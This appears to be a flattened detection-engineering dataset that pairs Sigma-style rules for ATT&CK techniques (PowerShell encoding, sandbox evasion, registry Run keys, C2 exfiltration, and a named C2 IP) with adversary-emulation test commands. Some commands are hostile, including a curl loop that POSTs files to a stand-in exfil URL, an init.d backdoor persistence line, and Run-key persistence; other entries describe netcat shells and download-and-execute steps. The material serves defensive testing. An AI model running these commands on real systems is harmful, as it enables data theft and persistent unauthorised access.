rules.title: PowerShell Execution with Potential Encoded Payload
rules.description: Detects execution of powershell.exe with encoded commands or unusually long command lines, indicating possible malicious PowerShell usage.
falsepositives: Legitimate administrative scripts executed via PowerShell
Windows Update or system maintenance tasks that use PowerShell
Security or monitoring tools that invoke PowerShell with long arguments

rules.title: Detection: Phishing
rules.description: WildCard threat actor used a dead drop resolver method to host a text file on GDrive
falsepositives: Legitimate administrative activity

rules.title: Virtualization/Sandbox Evasion via Rust Compilation
rules.description: Detects potential virtualization/sandbox evasion techniques by monitoring for Rust compilation in temporary directories or with suspicious command line flags
falsepositives: Legitimate Rust development environments
Compiling Rust code in temporary directories for testing purposes

rules.title: User Execution of Masquerading DMAdevice or AppMessagingRegistrar Executables
rules.description: Detects execution of suspicious binaries named DMAdevice.exe or AppMessagingRegistrar.exe that may be used for user‑executed malware, while excluding the known legitimate System32 version of DMAdevice.exe.
falsepositives: Legitimate applications that use the same executable names but reside outside of the System32 directory.
Custom in‑house tools named DMAdevice.exe or AppMessagingRegistrar.exe.

rules.title: Detection: PowerShell
rules.description: Detected PowerShell activity via NLP pattern matching
falsepositives: Legitimate administrative activity

rules.title: Detection: Email Collection
rules.description: Attacker collected user information, including IP address, serial number, and username
falsepositives: Legitimate administrative activity

rules.title: System Information Discovery via Whoami
rules.description: Detects the use of 'whoami' to gather system information, which could be used for discovery tactics
falsepositives: Legitimate system administration tasks
Security audits

rules.title: Execution of PowerShell or WMI with Long Command Line
rules.description: Detects PowerShell, WMIC, or WMIPRVSE processes executing commands longer than 100 characters, indicating possible use of encoded or complex malicious payloads (e.g., -enc, -command, whoami).
falsepositives: Legitimate administrative PowerShell scripts with long command lines
System management tools invoking WMIC or WMIPRVSE with extensive arguments
Automated deployment or configuration scripts that use encoded PowerShell commands

rules.title: Detection: Application Window Discovery
rules.description: WildCard threat actor used a custom alphabet and code reuse to avoid detection
falsepositives: Legitimate administrative activity

rules.title: Detection: Ingress Tool Transfer
rules.description: Transfer of tools (e.g., malware) into the target environment
falsepositives: Legitimate administrative activity

rules.title: Detection: Modify Registry
rules.description: WildCard threat actor used registry modifications to maintain persistence
falsepositives: Legitimate administrative activity

rules.title: Exfiltration Over Command and Control Channel
rules.description: Detects exfiltration of data over the C2 channel using HTTP requests
falsepositives: Legitimate web browsing activity
Software updates or downloads
rules.technique_name: Exfiltration Over Command and Control Channel

rules.title: Signed Binary Proxy Execution via php-cgi.exe
rules.description: Detects execution of the signed binary php-cgi.exe when launched outside of known legitimate web server contexts, indicating possible proxy execution of malicious code.

detection.condition: selection and not excluded_parent and not path_exclusion

falsepositives: Legitimate web server processes launching php-cgi.exe from standard installation directories.
Scheduled tasks or maintenance scripts that invoke php-cgi.exe for legitimate purposes.

rules.title: Outbound Connection to Known Malicious IP on Port 443 with Suspicious Execution Context
rules.description: Detects outbound network connections to 85.31.231.49:443 initiated by typical C2 execution binaries (PowerShell, cmd, wscript, cscript) while excluding known benign parent processes. Addresses non‑standard port usage for command and control.

detection.condition: selection and risky_process and not good_parent

falsepositives: Legitimate administrative scripts using PowerShell or cmd to contact the same IP for internal services.
Approved software that runs under a risky binary but is launched by a trusted parent process.

rules.title: Detection: Create or Modify System Process
rules.description: Detected Create or Modify System Process activity via NLP pattern matching
falsepositives: Legitimate administrative activity

rules.title: Detection: Obfuscated Files or Information
rules.description: Detected Obfuscated Files or Information activity via NLP pattern matching
falsepositives: Legitimate administrative activity

rules.title: Detection: Windows Management Instrumentation
rules.description: Detected Windows Management Instrumentation activity via NLP pattern matching
falsepositives: Legitimate administrative activity

rules.title: Archive Collected Data via Common Archivers and PowerShell Encoded Commands
rules.description: Detects execution of common archiving utilities (tar, 7z, zip, gzip) and PowerShell commands that perform compression or use encoded commands, indicating possible data collection and archiving activity.

detection.condition: selection_tar or selection_7z or selection_zip or selection_gzip or selection_ps_compress or selection_ps_enc or selection_ps_enc_short

falsepositives: Legitimate system backup or maintenance scripts using tar, 7z, zip, gzip or PowerShell Compress-Archive
Administrative tasks that compress log files or deployment packages
Software installers that bundle resources using archiving utilities

rules.title: Registry Run Keys Detection
rules.description: Detects Registry Run Keys activity via process creation events
falsepositives: Legitimate system administration tasks modifying the Registry Run Keys
Software installation or updates modifying the Registry Run Keys

attacks.description: Basic command to display the current date using PowerShell
attacks.expected_behavior: Displays the current date

attacks.description: Intermediate command to create a file in the temp directory using PowerShell
attacks.expected_behavior: Creates a file named test.txt in the temp directory with the content 'Hello World'

attacks.description: Advanced command to create an encoded file using PowerShell
attacks.expected_behavior: Creates a file named encoded.txt in the temp directory with the UTF8 encoded bytes of 'Hello World'

attacks.description: Execute a basic PowerShell command to get the current date
attacks.expected_behavior: The command will print the current date to the console

attacks.description: Create a temporary file using PowerShell
attacks.expected_behavior: A file named test.txt will be created in the $env:TEMP directory with the content 'Hello World'

attacks.description: Compress a file using PowerShell
attacks.expected_behavior: A zip file named test.zip will be created in the $env:TEMP directory containing the test.txt file

attacks.description: Write a test phishing payload to a text file in %TEMP%
attacks.expected_behavior: A text file named test.txt is created in %TEMP% with the contents 'Test phishing payload'

attacks.description: Read the contents of the test phishing payload text file using PowerShell
attacks.expected_behavior: The contents of the test.txt file are read and displayed in the console

attacks.description: Use certutil to download a test file from a URL and save it to %TEMP%
attacks.expected_behavior: A text file named test.txt is downloaded from the specified URL and saved to %TEMP%

attacks.command: echo 'This is a phishing text file' > phishing.txt
attacks.description: Create a text file named phishing.txt in the current directory with content that could be used in a phishing attack.
attacks.expected_behavior: A file named phishing.txt will be created in the current directory with the specified content.

attacks.description: Download a text file from a URL (assuming internet access for demonstration) and save it locally, simulating a phishing file download.
attacks.expected_behavior: A file named phishing.txt will be downloaded from the specified URL and saved in the current directory.

attacks.description: Copy the phishing.txt file to the /tmp directory, simulating the spread of a malicious file.
attacks.expected_behavior: The phishing.txt file will be copied to the /tmp directory.

attacks.command: powershell -Command "& { Add-Type -AssemblyName System.Diagnostics; [Diagnostics.Process]::Start('cmd.exe', '/c echo This is a test > %TEMP%\test.txt') }"
attacks.description: This command uses PowerShell to start a new cmd.exe process that writes a test string to a file in the temp directory, potentially evading sandbox detection by using a child process.
attacks.expected_behavior: Creates a file named test.txt in the temp directory with the content 'This is a test'.

attacks.description: This command uses certutil to download a file from a URL and then displays its contents, potentially evading detection by using a built-in tool for downloading and executing content.
attacks.expected_behavior: Downloads a file from the specified URL and displays its contents in the command prompt.

attacks.command: powershell -Command "& { $wshell = New-Object -ComObject WScript.Shell; $wshell.Run('cmd /c echo Hello > %TEMP%\hello.txt', 0, false) }"
attacks.description: This command uses PowerShell to create a COM object that runs a command prompt with a command to write 'Hello' to a file in the temp directory, hiding the command prompt window and potentially evading visual detection.
attacks.expected_behavior: Creates a file named hello.txt in the temp directory with the content 'Hello'. The command prompt window is not visible.

attacks.description: Checking dmesg output for indicators of virtualization
attacks.expected_behavior: The command checks the kernel messages for any indication of virtualization, which could be used to evade sandbox detection.

attacks.description: Checking CPU info for VMware indicators
attacks.expected_behavior: This command looks for specific strings in the CPU information that might indicate the presence of a VMware virtualization environment.

attacks.description: Detecting VMware virtualization through device files
attacks.expected_behavior: The presence of certain device files can indicate virtualization. This command checks for a VMware-specific device file and outputs a message if found.

attacks.description: Downloads a malicious executable from a URL and executes it
attacks.expected_behavior: The malicious executable will be downloaded and executed

attacks.description: Executes a malicious executable using PowerShell
attacks.expected_behavior: The malicious executable will be executed

attacks.description: Executes a malicious executable using the command prompt
attacks.expected_behavior: The malicious executable will be executed

attacks.command: echo 'This is a test payload' > ~/test_payload.sh; chmod +x ~/test_payload.sh; ~/test_payload.sh
attacks.description: Basic command to create and execute a test payload script
attacks.expected_behavior: Creates a test payload script, makes it executable, and runs it.

attacks.description: Intermediate command to download and execute a test script from a URL
attacks.expected_behavior: Downloads a test script from a URL, makes it executable, and runs it.

attacks.command: sudo bash -c 'echo "This is a test payload" > /tmp/test_payload.sh; chmod +x /tmp/test_payload.sh; /tmp/test_payload.sh'
attacks.description: Advanced command to create and execute a test payload script with elevated privileges
attacks.expected_behavior: Creates a test payload script in /tmp, makes it executable, and runs it with elevated privileges.

attacks.expected_behavior: The command will print 'Hello World' to the console without any errors or system impact.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic exfiltration using curl to send a file over HTTP
attacks.expected_behavior: The command sends the contents of /path/to/testfile to http://example.com/exfil using a POST request.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Intermediate exfiltration using base64 encoding before sending over HTTP
attacks.expected_behavior: The command encodes /path/to/testfile with base64 and pipes the output to curl, which sends it to http://example.com/exfil.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: bash -c 'for file in /path/to/*; do curl -X POST -d @$file http://example.com/exfil; done'
attacks.description: Advanced exfiltration using a bash loop to send multiple files
attacks.expected_behavior: The command uses a bash loop to iterate over files in /path/to/, sending each one to http://example.com/exfil. Requires admin privileges for access to the files.

attacks.description: Decodes a base64 encoded string to an executable and runs it

attacks.description: Executes a malicious script using powershell
attacks.expected_behavior: Executes the malicious script

attacks.description: Using curl to download and pipe a script to bash for execution, simulating a signed binary proxy execution.
attacks.expected_behavior: The command downloads a script from a specified URL and executes it using bash, demonstrating how a signed binary could be used to proxy malicious code execution.

attacks.description: Creating a temporary script, making it executable, and then executing it, showcasing a basic form of proxy execution.
attacks.expected_behavior: This command creates a simple script in a temporary location, changes its permissions to make it executable, and then runs it, demonstrating a straightforward method of executing code via a proxy.

attacks.description: Using sudo to create and execute a script in a system binary directory, simulating a more advanced scenario of signed binary proxy execution.
attacks.expected_behavior: This command utilizes sudo to gain elevated privileges, creates a script in a system binary directory, makes it executable, and then executes it, demonstrating a more complex scenario of proxy execution that requires admin privileges.

attacks.command: netsh interface portproxy add v4tov4 listenport=8080 connectaddress=localhost connectport=80
attacks.description: Configure port forwarding to demonstrate non-standard port usage for C2 communication.
attacks.expected_behavior: This command sets up a port forwarding rule, redirecting traffic from port 8080 to port 80, simulating C2 communication over a non-standard port.

attacks.description: Use PowerShell to create a TCP listener on a non-standard port, simulating C2 server initialization.
attacks.expected_behavior: This command starts a TCP listener on port 8080, demonstrating how an attacker might set up a C2 channel using a non-standard port.

attacks.command: cmd.exe /c "telnet localhost 8080 & echo 'Connected to non-standard port'"
attacks.description: Establish a connection to a non-standard port using telnet, simulating C2 communication.
attacks.expected_behavior: This command attempts to connect to localhost on port 8080 using telnet and prints a success message if connected, demonstrating a basic form of C2 communication over a non-standard port.

attacks.description: Basic example using netcat to listen on port 8080 and execute /bin/bash upon connection establishment.
attacks.expected_behavior: Establishes a listener on port 8080, executing /bin/bash when a connection is made, potentially allowing unauthorized access.

attacks.description: Intermediate example connecting to a remote server on a non-standard port (443) used for C2 communication, simulating a covert channel.
attacks.expected_behavior: Attempts to establish a connection to example.com on port 443, which could be used for command and control communication, highlighting the use of non-standard ports.

attacks.description: Advanced example using UDP for a reverse shell on port 8081, demonstrating resilience and another aspect of non-standard port usage.
attacks.expected_behavior: Sets up a UDP listener on port 8081, executing /bin/sh upon connection, which could be used for persistent access, showing the technique's advanced application.

attacks.description: Create a new registry key that executes a PowerShell command when a user logs in, writing 'test2' to a file in the temp directory
attacks.expected_behavior: A new registry key is created, and when a user logs in, the PowerShell command 'echo test2 > %TEMP%\test2.txt' is executed, writing 'test2' to a file in the temp directory

attacks.command: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test3 /t REG_SZ /d "cmd.exe /c mkdir %TEMP%\test3 && echo test3 > %TEMP%\test3\test3.txt" /f
attacks.description: Create a new registry key that executes a command when a user logs in, creating a new directory and writing 'test3' to a file in that directory
attacks.expected_behavior: A new registry key is created, and when a user logs in, the command 'cmd.exe /c mkdir %TEMP%\test3 && echo test3 > %TEMP%\test3\test3.txt' is executed, creating a new directory and writing 'test3' to a file in that directory

attacks.description: Appends a command to execute a script at startup.
attacks.expected_behavior: The command /tmp/malicious.sh will be executed at system startup.

attacks.description: Uses crontab to schedule a command execution at startup.
attacks.expected_behavior: The script /tmp/persist.sh will be executed at system startup.

attacks.command: sudo cp /tmp/backdoor.sh /etc/init.d/ && sudo update-rc.d backdoor.sh defaults
attacks.description: Copies a script to the init.d directory and configures it to run at startup.
attacks.expected_behavior: The script /tmp/backdoor.sh will be executed at system startup.
